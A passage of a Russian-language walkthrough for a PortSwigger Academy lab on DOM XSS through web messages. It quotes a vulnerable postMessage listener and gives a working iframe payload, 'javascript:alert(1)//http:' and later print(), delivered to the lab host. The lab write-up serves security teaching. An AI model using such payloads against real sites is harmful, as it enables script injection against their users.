и увидим следующий скрипт
```
<script>
                        window.addEventListener('message', function(e) {
                            var url = e.data;
                            if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
                                location.href = url;
                            }
                        }, false);
                    </script>
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/17.%20DOM-based%20vulnerabilities/2.%20DOM%20XSS%20using%20web%20messages%20and%20a%20JavaScript%20URL/pics%20for%20walkthrough/1.png)

 JavaScript содержит ошибочную проверку `indexOf()`, которая ищет строки `"http:"` или `"https:"` в любом месте веб-сообщения. Он также содержит местоположение `location.href`

Этот скрипт отправляет веб-сообщение, содержащее произвольную полезную информацию JavaScript, а также строку `"http:"`. Второй аргумент указывает, что для веб-сообщения допускается любой целевой источник.

Когда iframe загружается, метод `postMessage()` отправляет полезную информацию JavaScript на главную страницу. Прослушиватель событий обнаруживает строку `"http:"` и продолжает отправлять полезную информацию в указанное местоположение.приемник внешних ссылок, где вызывается функция `alert(1)`.

Далее сконфигурируем payload
```
<iframe src="https://0a2c00fb04d74ba781fd5756002900e1.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:alert(1)//http:','*')">
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/17.%20DOM-based%20vulnerabilities/2.%20DOM%20XSS%20using%20web%20messages%20and%20a%20JavaScript%20URL/pics%20for%20walkthrough/2.png)

нажмем кнопку `View explot` и
и увидим, что XSS Отработал

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/17.%20DOM-based%20vulnerabilities/2.%20DOM%20XSS%20using%20web%20messages%20and%20a%20JavaScript%20URL/pics%20for%20walkthrough/3.png)


Изменим `alert(1)` на `print()` так как это требует задание, получив
```
<iframe src="https://0a2c00fb04d74ba781fd5756002900e1.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```
Нажем `Store` -> `Deliver exploit to victim`
и получим уведомление об успешно выполненной лабораторной работе
